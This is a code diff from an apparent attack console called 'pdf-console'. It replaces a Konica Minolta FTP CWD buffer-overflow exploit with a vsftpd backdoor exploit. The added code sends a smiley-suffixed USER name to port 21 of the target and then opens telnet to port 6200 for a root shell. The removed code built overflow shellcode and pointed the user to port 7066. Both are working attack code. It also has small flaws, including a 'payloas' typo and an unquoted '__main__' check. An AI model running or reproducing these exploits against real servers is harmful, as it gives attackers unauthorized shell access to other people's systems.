@@ -67,27 +67,19 @@ class vsftpdBackdoorMenu(cmd.Cmd):
     payload = ""
     for a in range(0, 7):
       payload += char[randint(0, 15)] + char[randint(0, 15)]
-    f = open("../../../payloads/konica_minolta_cwd.shell", "r")
-    for line in f.readlines():
-      payload += line[:-1].decode('string_escape')
-    f.close()
-    for a in range(0, 3000):
-      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
-      payload += tmp.decode('string_escape')
+    payload += ":)"
     print "[+]Payload generated."
-    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
+    print "[*]Sending payloas: " + payload
     s = socket(AF_INET, SOCK_STREAM)
     s.connect((self.host[0], 21))
     s.recv(1024)
-    s.send("USER " + self.user[0])
+    s.send("USER " + payload)
     s.recv(1024)
-    s.send("PASS " + self.passwd[0])
-    s.recv(1024)
-    s.send("CWD " + payload)
     s.close()
-    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
+    print "[+]Payload sent."
+    os.system("telnet %s 6200" % self.host[0])
 def main():
-  konicaminoltacwdoverflowmenu = konicaMinoltaCwdOverflowMenu()
-  konicaminoltacwdoverflowmenu.cmdloop("pdf-console attack(konica_minolta_cwd_overflow)% ")
+  menu = vsftpdBackdoorMenu()
+  menu.cmdloop("pdf-console attack(vsftpd_backdoor)% ")
 if __name__ == __main__:
   main()
